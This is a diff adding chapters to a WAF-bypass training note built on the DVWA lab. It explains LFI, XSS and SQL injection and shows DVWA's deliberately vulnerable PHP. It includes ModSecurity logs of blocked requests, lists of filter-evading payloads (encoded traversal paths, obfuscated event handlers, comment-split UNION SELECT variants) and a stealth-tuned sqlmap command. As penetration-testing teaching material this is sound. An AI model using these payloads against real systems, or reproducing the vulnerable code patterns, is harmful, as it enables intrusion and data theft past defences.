@@ -111,3 +111,285 @@ To search for specific bypass types
 
 To search in Exploit DB
 : site:exploit-db.com +WAF_NAME bypass
+
+* local file inclusion (LFI)
+LFI is a type of web attack that allows an attacker to access, read, or execute files on the server by exploiting a vulnerability in the web application.
+
+An LFI attack leverages this file inclusion mechanism to trick the web application into including unwanted or malicious files.  This can allow the attacker to access sensitive files on the server, modify the web application's code, or execute malicious code on the server.
+
+*accessing sensitive files* ->
+An attacker can access system files like /etc/passwd to obtain sensitive information such as usernames and password hashes.
+
+*executing malicious code* ->
+An attacker can create a malicious PHP script on the server and trick the web application into running it, potentially gaining full control over the server.
+
+For example, the source code of DVWA (Damn Vulnerable Web Application) for demonstrating LFI might be as follows:
+#+begin_src php
+<?php
+
+define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
+require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';
+
+dvwaPageStartup( array( 'authenticated' ) );
+
+$page = dvwaPageNewGrab();
+$page[ 'title' ]   = 'Vulnerability: File Inclusion' . $page[ 'title_separator' ].$page[ 'title' ];
+$page[ 'page_id' ] = 'fi';
+$page[ 'help_button' ]   = 'fi';
+$page[ 'source_button' ] = 'fi';
+
+dvwaDatabaseConnect();
+
+$vulnerabilityFile = '';
+switch( dvwaSecurityLevelGet() ) {
+        case 'low':
+                $vulnerabilityFile = 'low.php';
+                break;
+        case 'medium':
+                $vulnerabilityFile = 'medium.php';
+                break;
+        case 'high':
+                $vulnerabilityFile = 'high.php';
+                break;
+        default:
+                $vulnerabilityFile = 'impossible.php';
+                break;
+}
+
+require_once DVWA_WEB_PAGE_TO_ROOT . "vulnerabilities/fi/source/{$vulnerabilityFile}";
+
+// if( count( $_GET ) )
+if( isset( $file ) )
+        include( $file );
+else {
+        header( 'Location:?page=include.php' );
+        exit;
+}
+
+dvwaHtmlEcho( $page );
+
+?>
+#+end_src
+
+The low security level code in low.php may look like:
+#+begin_src php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+?>
+#+end_src
+
+For example, without any WAF, the following payload would work without issues:
+: ?page=../../../../../../etc/passwd
+
+However, a WAF can easily detect this payload as shown in the log:
+#+begin_src python
+--023cda21-A--
+[20/Jun/2024:08:30:07.344460 +0000] ZnPoj6IdlbwW3kre-lJF8AAAAAI ATTACKER_IP 57980 VICTIM_IP 80
+--023cda21-B--
+GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
+Host: VICTIM_IP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: security=low; PHPSESSID=mkir9lhmrjcnhd7fvbfkjvrtgr
+Upgrade-Insecure-Requests: 1
+
+--023cda21-F--
+#+end_src
+
+** bypass
+Let's say we are trying to access a sensitive file under the /opt directory, using the following requests, we find that access is blocked:
+#+begin_src python
+?page=/opt/sensitive_file
+?page=../../../../../../opt/sensitive_file
+#+end_src
+
+In this scenario, we need to try different combinations to bypass the WAF's filters.
+
+ For instance, substituting the / character with \ might help, but in many cases, encoding the URL can effectively bypass the filter. By URL encoding the path, we can bypass the WAF filter:
+ : ?page=%2Fopt%2Fsensitive%5Ffile
+
+* cross-site scripting (XSS)
+XSS is an attack that exploits a security vulnerability in web applications, allowing attackers to execute malicious code in another user's browser.
+
+This code is often in the form of JavaScript and can be used for various purposes such as stealing session cookies, altering the appearance of the website, or downloading malware onto the user's computer.
+
+- Reflected XSS: The attacker sends malicious code to the web application via a URL or form data. The application reflects this code back to the user's browser without proper filtering or sanitization, and the code is executed in the user's browser.
+- Stored XSS: The attacker permanently places malicious code into the web application's database or another storage area. This code is included in pages viewed by other users and is executed in those users' browsers.
+- DOM Based XSS: The attacker injects malicious code into the web page's DOM (Document Object Model) through client-side JavaScript code. This code is triggered during user interaction or page load and is executed in the user's browser.
+
+*dvwa xss code* ->
+#+begin_src php
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+        // Feedback for end user
+        $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+}
+
+?>
+#+end_src
+
+If we want to use a function like onmouseover without WAF, there is no problem:
+: <a onmouseover=alert(document.cookie)>xss link</a>
+
+** bypass
+Since the goal here is to bypass JavaScript, we can discover numerous methods. However, for WAFs filtering onxxx, the most effective bypass techniques are as follows:
+#+begin_src javascript
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
+<img src='1' onerror/=alert(0) />
+...
+#+end_src
+
+*exampl* ->
+: <object onafterscriptexecute=confirm(0)>
+
+* SQLi
+SQL injection is a type of attack used by malicious individuals to gain unauthorized access to a web application's database, modify the data, or delete it.
+
+In this attack, the attacker inserts malicious code into the SQL queries used by the web application to communicate with the database.
+
+Web applications create SQL queries to fetch information from the database using the data entered by users (e.g., username, password, search term).
+
+*dvwa sqli code* ->
+#+begin_src php
+<?php
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) {
+        // Get input
+        $id = $_REQUEST[ 'id' ];
+
+        switch ($_DVWA['SQLI_DB']) {
+                case MYSQL:
+                        // Check database
+                        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+                        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+                        // Get results
+                        while( $row = mysqli_fetch_assoc( $result ) ) {
+                                // Get values
+                                $first = $row["first_name"];
+                                $last  = $row["last_name"];
+
+                                // Feedback for end user
+                                $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+                        }
+
+                        mysqli_close($GLOBALS["___mysqli_ston"]);
+                        break;
+                case SQLITE:
+                        global $sqlite_db_connection;
+
+                        #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
+                        #$sqlite_db_connection->enableExceptions(true);
+
+                        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+                        #print $query;
+                        try {
+                                $results = $sqlite_db_connection->query($query);
+                        } catch (Exception $e) {
+                                echo 'Caught exception: ' . $e->getMessage();
+                                exit();
+                        }
+
+                        if ($results) {
+                                while ($row = $results->fetchArray()) {
+                                        // Get values
+                                        $first = $row["first_name"];
+                                        $last  = $row["last_name"];
+
+                                        // Feedback for end user
+                                        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+                                }
+                        } else {
+                                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
+                        }
+                        break;
+        }
+}
+
+?>
+#+end_src
+
+A direct payload won't work here as the WAF will catch it:
+: ' or 1=1 -- -
+
+*waff log* ->
+#+begin_src python
+--95d30709-A--
+[20/Jun/2024:08:26:30.170636 +0000] ZnPntg9N6NOgQglLgIM6twAAAAA ATTACKER_IP 42428 VICTIM_IP 80
+--95d30709-B--
+GET /DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1+--+-&Submit=Submit HTTP/1.1
+Host: VICTIM_IP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://VICTIM_IP/DVWA/vulnerabilities/sqli/
+Cookie: security=low; PHPSESSID=mkir9lhmrjcnhd7fvbfkjvrtgr
+Upgrade-Insecure-Requests: 1
+
+--95d30709-F--
+#+end_src
+
+** bypass
+Generally, although based on trial and error, there are several methods we can use to avoid blocked characters or bypass space characters
+
+For example, by replacing space characters with /**/, we can prevent the payload from being matched by regex. Therefore, our initial payload:
+: ' or/**/1=1/**/-- -
+
+There are many payloads we can try. The idea is to prevent the regex from matching them.
+: 1' and 1=1 union select database(),user()#
+
+Any of the following can be used to modify the union select part of the payload:
+#+begin_src sh
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+...
+#+end_src
+
+* bypassing with tools
+Although we've been testing manually throughout the training, there are automated tools available to test all these WAF payloads.
+
+** sqlmap
+SQLMap is an open-source penetration testing tool used to automatically detect and exploit SQL injection vulnerabilities.
+
+It is written in Python and supports many database management systems (DBMS).
+
+- Automated Scanning: SQLMap can automatically scan a web application to detect SQL injection vulnerabilities.
+- Extracting Database Information: Once a vulnerability is identified, SQLMap can extract the database type, version, usernames, tables, columns, and even data.
+- Operating on Database: SQLMap can perform read, write, update, and delete operations on the database.
+- File System Access: In some cases, SQLMap can access the server's file system, allowing it to read or write files.
+- Command Execution: SQLMap, in some cases, can execute OS commands on the server.
+- Wide DBMS Support: It supports many popular DBMS such as MySQL, PostgreSQL, SQLite, Microsoft SQL Server, Oracle, IBM DB2.
+- Ease of Use: It has an easy-to-use interface suitable for both beginners and experienced users.
+
+It is important to play with parameters like --level, --risk, --random-agent, and --delay to find the best scanning method. Otherwise, all requests might be caught by the WAF.
+#+begin_src sh
+sqlmap -u 'http://VICTIM_IP/DVWA/vulnerabilities/sqli/?id=1' --cookie="security=low; PHPSESSID=fjiu1r8e909m14pqic7a07d3dn" --random-agent --delay 0.1 --tamper=modsecurityzeroversioned,space2hash
+#+end_src
